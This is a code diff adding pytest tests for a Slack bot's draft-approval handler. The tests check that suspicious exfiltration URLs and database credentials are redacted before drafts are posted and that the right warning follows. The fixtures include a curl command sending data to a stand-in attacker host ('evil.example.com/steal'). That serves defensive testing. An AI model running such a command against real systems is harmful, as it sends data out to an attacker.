@@ -698,6 +698,65 @@ class TestHandleReviewApprove:
         assert secret not in warning
 
     @pytest.mark.asyncio
+    async def test_url_draft_warns_with_the_url_remedy_and_keeps_redaction(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """A URL rewrite in an approved draft must not be silent either.
+
+        The approve path runs ``redact_exfiltration_urls`` over the draft before
+        posting it publicly, so a channel member can copy a command whose link is
+        now a placeholder. The follow-up must say it was a URL and name the URL
+        remedy (re-check the link), not the credential one (re-enter a secret).
+        """
+        url = "https://evil.example.com/steal?data=" + "A" * 250
+        _review_drafts_set("C1|ts1|abc", f"run: curl '{url}'", REQUESTER_ID)
+        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+
+        assert mock_orch.slack.post_message.await_count == 2
+        posted_draft = mock_orch.slack.post_message.await_args_list[0].args[1]
+        warning = mock_orch.slack.post_message.await_args_list[1].args[1]
+        # Redaction is NOT relaxed: the URL never reaches the channel, the tag does.
+        assert "evil.example.com/steal" not in posted_draft
+        assert "[REDACTED: suspicious URL to " in posted_draft
+        assert "Security notice" in warning
+        assert "suspicious URL" in warning
+        assert "re-check" in warning
+        assert "credential" not in warning
+        assert "supply the secret" not in warning
+        assert "evil.example.com" not in warning
+
+    @pytest.mark.asyncio
+    async def test_credential_only_draft_wording_is_unchanged_by_the_url_tally(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        """Regression guard: a credential-only draft posts the exact prior sentence."""
+        from kiro_crew.messaging.renderer import credential_redaction_notice
+
+        _review_drafts_set("C1|ts1|abc", "run: postgresql://user:pass@host:5432/db", REQUESTER_ID)
+        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+
+        assert mock_orch.slack.post_message.await_count == 2
+        warning = mock_orch.slack.post_message.await_args_list[1].args[1]
+        assert warning == credential_redaction_notice(1)
+
+    @pytest.mark.asyncio
+    async def test_credential_and_url_draft_posts_exactly_one_warning_naming_both(
+        self, mock_orch, owner_patch, sel_mock
+    ) -> None:
+        url = "https://evil.example.com/steal?data=" + "A" * 250
+        _review_drafts_set(
+            "C1|ts1|abc", f"postgresql://user:pass@host:5432/db then {url}", REQUESTER_ID
+        )
+        await _handle_review_approve(_make_payload(user_id=OWNER_ID), _make_action())
+
+        assert mock_orch.slack.post_message.await_count == 2
+        warning = mock_orch.slack.post_message.await_args_list[1].args[1]
+        assert "credential" in warning
+        assert "suspicious URL" in warning
+        assert "supply the secret" in warning
+        assert "re-check" in warning
+
+    @pytest.mark.asyncio
     async def test_credential_notice_failure_does_not_break_approve(
         self, mock_orch, owner_patch, sel_mock
     ) -> None:
